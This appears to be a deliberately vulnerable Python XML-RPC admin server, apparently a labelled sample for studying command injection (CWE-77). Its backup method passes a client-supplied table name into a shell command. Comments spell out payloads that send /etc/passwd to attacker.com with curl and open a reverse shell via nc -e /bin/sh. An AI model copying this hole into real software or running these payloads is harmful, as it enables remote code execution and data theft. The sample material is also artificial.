import os
import sqlite3
import logging
import subprocess
from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
from datetime import datetime

# Configure logging for the Legacy RPC Administration Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - AdminRPC - %(levelname)s - %(message)s'
)
logger = logging.getLogger("XMLRPCAdminServer")

DB_FILE = "rpc_audit.db"
RPC_HOST = "0.0.0.0"
RPC_PORT = 9001
DEFAULT_BACKUP_DIR = "/var/backups/databases"

def init_audit_db():
    """Initializes the SQLite database to track RPC administration actions."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE rpc_audit_logs (
            log_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            method_called TEXT NOT NULL,
            status TEXT NOT NULL,
            details TEXT
        )
    ''')
    
    mock_history = [
        ('get_system_uptime', 'SUCCESS', 'Executed successfully.'),
        ('execute_table_backup', 'FAILED', 'Database not found.')
    ]
    cursor.executemany('''
        INSERT INTO rpc_audit_logs (method_called, status, details)
        VALUES (?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("RPC Audit database initialized.")

def log_rpc_action(method: str, status: str, details: str):
    """Records the outcome of an RPC administration attempt."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO rpc_audit_logs (method_called, status, details) VALUES (?, ?, ?)",
            (method, status, details)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log RPC action: {e}")

class AdminRPCServices:
    """Exposed RPC methods for remote server administration."""

    def ping(self):
        """Simple health check endpoint."""
        logger.info("Ping requested by remote client.")
        return "pong"

    def get_system_uptime(self):
        """Returns the current system uptime."""
        try:
            with open('/proc/uptime', 'r') as f:
                uptime_seconds = float(f.readline().split()[0])
                log_rpc_action("get_system_uptime", "SUCCESS", f"Uptime: {uptime_seconds}")
                return f"System uptime: {uptime_seconds} seconds"
        except Exception as e:
            log_rpc_action("get_system_uptime", "ERROR", str(e))
            return f"Error retrieving uptime: {e}"

    def execute_table_backup(self, database_name: str, table_name: str) -> str:
        """
        VULNERABLE FUNCTION: CWE-77 Command Injection
        Trigger Path: XML-RPC Method Argument ('table_name' string passed over HTTP/XML)
        """
        logger.info(f"Initiating table backup for {database_name}->{table_name}")
        
        if not os.path.exists(DEFAULT_BACKUP_DIR):
            os.makedirs(DEFAULT_BACKUP_DIR, exist_ok=True)
            
        # Vulnerability: Direct string concatenation of the XML-RPC argument into a bash command string.
        # The 'table_name' variable is fully controlled by the remote XML-RPC client.
        backup_cmd = f"sqlite3 {database_name} '.dump {table_name}' | gzip > {DEFAULT_BACKUP_DIR}/{table_name}_backup.sql.gz"
        
        try:
            logger.debug(f"Executing system backup script: {backup_cmd}")
            
            # shell=True allows the injection of shell metacharacters (e.g., ;, &&, |)
            # An attacker can inject a payload via the table_name XML-RPC argument like:
            # "users' ; curl http://attacker.com/leak?data=$(cat /etc/passwd | base64) ; '"
            process = subprocess.Popen(
                backup_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            if process.returncode == 0:
                logger.info(f"Backup successful for table {table_name}.")
                log_rpc_action("execute_table_backup", "SUCCESS", f"Backed up {table_name}")
                return "Backup completed successfully."
            else:
                logger.error(f"Backup failed for table {table_name}.")
                # Leaking stderr back into the RPC response allows attackers to see command output
                log_rpc_action("execute_table_backup", "FAILED", stderr)
                return f"Backup failed:\n{stderr}"
                
        except subprocess.TimeoutExpired:
            logger.error(f"Backup timed out for table {table_name}.")
            log_rpc_action("execute_table_backup", "TIMEOUT", "Process exceeded 30 seconds.")
            return "Error: Backup process timed out."
        except Exception as e:
            logger.error(f"Critical error during backup: {e}")
            log_rpc_action("execute_table_backup", "ERROR", str(e))
            return f"Error: {str(e)}"


class RestrictiveRequestHandler(SimpleXMLRPCRequestHandler):
    """Custom request handler that restricts methods to a specific path."""
    rpc_paths = ('/RPC2',)


def start_rpc_server():
    """Starts the XML-RPC server for remote administration."""
    init_audit_db()
    
    server = SimpleXMLRPCServer((RPC_HOST, RPC_PORT), requestHandler=RestrictiveRequestHandler, allow_none=True)
    server.register_introspection_functions()
    
    # Register the admin services instance
    server.register_instance(AdminRPCServices())
    
    logger.info(f"XML-RPC Admin Server listening on http://{RPC_HOST}:{RPC_PORT}/RPC2")
    
    # Example Malicious Client Payload via Python xmlrpc.client:
    # import xmlrpc.client
    # proxy = xmlrpc.client.ServerProxy("http://127.0.0.1:9001/RPC2")
    # proxy.execute_table_backup("app.db", "users' | nc -e /bin/sh attacker.com 4444 ; echo '")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down XML-RPC Admin Server.")
    finally:
        server.server_close()

if __name__ == "__main__":
    start_rpc_server()
